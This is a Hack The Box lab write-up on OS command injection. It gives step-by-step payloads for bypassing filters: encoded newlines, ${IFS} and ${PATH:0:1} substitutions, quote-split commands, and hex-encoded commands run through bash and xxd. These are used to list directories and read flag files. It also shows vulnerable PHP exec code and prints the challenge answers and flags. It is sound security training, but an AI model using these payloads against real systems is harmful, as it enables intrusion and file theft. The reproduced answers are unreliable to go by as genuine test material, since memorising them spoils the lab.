# HTB-Command_Injections

## Table of Contents
0. [Tools/Useful Links](#toolsuseful-links)
1. [Exploitation](#exploitation)
    1. [Detection](#detection)
    2. [Injecting Commands](#injecting-commands)
    3. [Other Injection Operators](#other-injection-operators)
2. [Filter Evasion](#filter-evasion)
    1. [Identifying Filters](#identifying-filters)
    2. [Bypassing Space Filters](#bypassing-space-filters)
    3. [Bypassing Other Blacklisted Characters](#bypassing-other-blacklisted-characters)
    4. [Bypassing Blacklisted Commands](#bypassing-blacklisted-commands)
    5. [Advanced Command Obfuscation](#advanced-command-obfuscation)
3. [Skill Assesment](#skill-assesment)

## Tools/Useful Links
1. [Bypass without space](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space)
2. [Bashfuscator](https://github.com/Bashfuscator/Bashfuscator)
3. [DOSfuscation](https://github.com/danielbohannon/Invoke-DOSfuscation)

## Exploitation
### Detection
#### Challenges
1. Try adding any of the injection operators after the ip in IP field. What did the error message say (in English)?

    To solve this, we can just type this in the input field: `127.0.0.1;`. The answer is `Please match the requested format.`.


### Injecting Commands
#### Challenges
1. Review the HTML source code of the page to find where the front-end input validation is happening. On which line number is it?

    We can solve this by looking at the source code of the page. We can see that in line **17** it has the following code: 

    ```html
    <input type="text" name="ip" placeholder="127.0.0.1" pattern="^((\d{1,2}|1\d\d|2[0-4]\d|25[0-5])\.){3}(\d{1,2}|1\d\d|2[0-4]\d|25[0-5])$">
    ```
    The answer is `17`.

### Other Injection Operators
#### Challenges
1. Try using the remaining three injection operators (new-line, &, |), and see how each works and how the output differs. Which of them only shows the output of the injected command?

    To solve this, we can try using the remaining three injection operators (new-line, &, |), and see how each works and how the output differs. 
    
    ![alt text](<Assets/Other Injection Operators - 1.png>)

    Pipe operator (**|**) only shows the output of the injected command. The answer is `|`.


## Filter Evasion
### Identifying Filters
#### Challenges
1. Try all other injection operators to see if any of them is not blacklisted. Which of (new-line, &, |) is not blacklisted by the web application?

    We can try to write `127.0.0.1` followed by the encoded injection operators immedietly (without any space). The working payload is:
    
    ```txt
    127.0.0.1%0a
    ```
    
    The answer is `new-line`.

### Bypassing Space Filters
#### Challenges
1. Use what you learned in this section to execute the command 'ls -la'. What is the size of the 'index.php' file?

    We can use this payload:
    
    ```txt
    127.0.0.1%0a{ls,-la}
    ```
    The answer is `1613`.

### Bypassing Other Blacklisted Characters
#### Challenges
1. Use what you learned in this section to find name of the user in the '/home' folder. What user did you find?

    We can combine payload by using encoded new line, ${IFS} for bypass space, and ${PATH:0:1} for bypass slash. Here the payload is:

    ```txt
    127.0.0.1%0als${IFS}${PATH:0:1}home
    ```
    The answer is `1nj3c70r`.

### Bypassing Blacklisted Commands
#### Challenges
1. Use what you learned in this section find the content of flag.txt in the home folder of the user you previously found.

    We can use single quote (**'**) to bypass blacklisted command. Here the payload is:

    ```txt
    127.0.0.1%0ac'a't${IFS}${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt
    ```
    The answer is `HTB{b451c_f1l73r5_w0n7_570p_m3}`.

### Advanced Command Obfuscation
#### Challenges
1. Find the output of the following command using one of the techniques you learned in this section: find /usr/share/ | grep root | grep mysql | tail -n 1

    To solve this we can use xxd to convert the command to hex and then use bash to execute it. Here the command to convert to the hex is:

    ```bash
    echo -n 'find /usr/share/ | grep root | grep mysql | tail -n 1' | xxd -p | tr -d '\n'
    ```

    We will get this hex:

    ```txt
    66696e64202f7573722f73686172652f207c206772657020726f6f74207c2067726570206d7973716c207c207461696c202d6e2031
    ```
    Then, we can use bash to execute it. Here the payload is:

    ```txt
    127.0.0.1%0abash<<<$(xxd${IFS}-r${IFS}-p<<<66696e64202f7573722f73686172652f207c206772657020726f6f74207c2067726570206d7973716c207c207461696c202d6e2031)
    ```

    The answer is `/usr/share/mysql/debian_create_root_user.sql`.

## Skill Assesment
1. What is the content of '/flag.txt'?

    First we need to explore the website to know how the website works and what kind of the potential vulnerability. I found something interesting in the copy and move logic. Here the request of the move looks like:

    ![alt text](<Assets/Skill Assesment - 1.png>)

    The different between copy and move is the **move=1** parameter. The copy request doesnt has this parameter. I assume the source code looks like this:

    ```php
    $from = $_GET['from'];
    $to   = $_GET['to'];

    if (isset($_GET['move'])) {
        $command = "mv $from $to";
        exec($command);
    } elseif (isset($_GET['copy'])) {
        $command = "cp $from $to";
        exec($command);
    }   
    ```
    Based on that, the potential command injection is in the **to** parameter. I tried to test with some payload injector with sleep and i found that the one that works is backgroun operator (**&** or **%26**). Here the payload is:
    
    ```txt
    tmp%26sleep${IFS}10
    ```
    ![alt text](<Assets/Skill Assesment - 2.png>)

    Because it works, we can try to read the flag by copy the flag to the tmp directory. We can wrap it with **XXD** to convert the flag to hex and then use bash to execute it. Here the payload is:

    ```txt
    tmp%26bash%3c%3c%3c%24%28xxd%24%7bIFS%7d-r%24%7bIFS%7d-p%3c%3c%3c6370202f666c61672e747874202f7661722f7777772f68746d6c2f66696c65732f746d702f666c61672e747874%29    
    ```
    ![alt text](<Assets/Skill Assesment - 3.png>)
    
    The flag.txt will be available in the tmp directory. The answer is `HTB{c0mm4nd3r_1nj3c70r}`.
    
    
    